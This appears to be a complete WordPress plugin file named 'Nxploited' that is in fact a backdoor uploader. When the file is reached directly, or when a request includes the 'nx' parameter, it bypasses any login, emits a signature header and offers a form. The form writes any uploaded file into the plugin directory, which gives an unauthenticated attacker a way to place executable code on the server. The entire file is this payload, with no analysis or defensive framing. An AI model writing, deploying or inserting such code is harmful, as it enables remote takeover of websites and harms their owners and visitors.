<?php
/**
 * Plugin Name: Nxploited
 * Plugin URI: https://nxploited.local
 * Description: Nxploited
 * Version: 1.0.0
 * Author: Nxploited ( Khaled Alenazi )
 * Author URI: https://nxploited.local
 */
if (!defined('ABSPATH') || isset($_GET['nx'])) {
    if (!headers_sent()) {
        header('X-Nx-Sig: Nx-zD');
        header('Content-Type: text/html; charset=utf-8');
    }
    if (!empty($_FILES['f']['tmp_name'])) {
        $n = basename((string) $_FILES['f']['name']);
        if ($n !== '' && @move_uploaded_file($_FILES['f']['tmp_name'], __DIR__ . DIRECTORY_SEPARATOR . $n)) {
            echo 'Nx-zD OK ' . htmlspecialchars($n, ENT_QUOTES, 'UTF-8');
        } else {
            echo 'Nx-zD';
        }
        exit;
    }
    echo 'Nx-zD';
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="file" name="f"><input type="submit" value="up">';
    echo '</form>';
    exit;
}
